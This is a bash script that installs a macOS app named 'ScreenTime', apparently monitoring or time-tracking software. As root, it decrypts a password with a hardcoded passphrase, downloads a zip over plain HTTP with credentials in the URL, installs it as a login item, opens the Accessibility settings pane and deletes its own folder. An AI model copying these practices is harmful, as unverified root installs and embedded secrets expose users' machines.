#! /bin/bash
GRN='\033[1;32m'
NC='\033[0m'
apt=ScreenTime
usn=$(ls -t /Users | awk 'NR==1 {print $1}')
chk(){
    if [ -d "/Applications/$apt.app" ]; then
        pkill -f "ScreenTime" >/dev/null
        osascript -e 'tell application "System Events" to delete login item "ScreenTime"' >/dev/null
        rm -rf "/Applications/ScreenTime.app/" >/dev/null
        rm -rf "/Users/$usn/Library/Application Support/ScreenTime" >/dev/null
    fi
}
down_pack(){
	PASSWD=`cat .encry.txt | openssl aes-256-cbc -a -d -salt -pass pass:Secret@123#`
	url="http://rgrage:$PASSWD@mobile.ragewip.com/screentime/mac.zip"
	curl -O $url 2>&1
	unzip mac.zip >/dev/null
}
inst(){
	hdiutil mount ScreenTime.dmg >/dev/null
	cp -rvf "/Volumes/ScreenTime/ScreenTime.app" /Applications/ >/dev/null
}
remve(){
	hdiutil unmount "/Volumes/ScreenTime/" >/dev/null
    SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
    rm -rf $SCRIPT_DIR
}
perms(){
    chown -R root:wheel /Applications/ScreenTime.app >/dev/null
    osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Applications/ScreenTime.app", hidden:false}' >/dev/null
    open x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility && open /System/Library/CoreServices/ && open /Applications/ >/dev/null
}
setin(){
    clear
    if [ `whoami` != root ]; then
            echo "\033[0;31mPlease run this scripts as root or using sudo\033[0m "
            echo ""
            exit
    else
        printf "$GRN ### Looking Old 👍 $NC \n"
        chk
        printf "\n$GRN ### Downloading 👍$NC\n"
        down_pack
        printf "\n$GRN ### Installing 👍 $NC\n"
        inst
        printf "\n$GRN ### Removing 👍 $NC\n"
        remve
        printf "\n$GRN ### Change Settings 👍 $NC\n"
        perms
        printf "\n$GRN ### Done 👍 $NC\n"
        exit
    fi
}
setin
